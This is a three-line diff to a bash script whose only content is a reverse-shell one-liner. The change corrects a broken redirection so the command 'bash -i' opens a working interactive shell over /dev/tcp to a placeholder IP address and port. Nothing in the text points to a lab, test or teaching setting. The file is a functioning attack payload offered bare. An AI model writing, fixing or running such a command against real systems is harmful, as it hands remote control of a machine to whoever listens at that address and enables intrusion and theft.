@@ -1,3 +1,3 @@
 #! /bin/bash
 
-bash -i >& /dev/tcp/<ip>/<port>&1
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
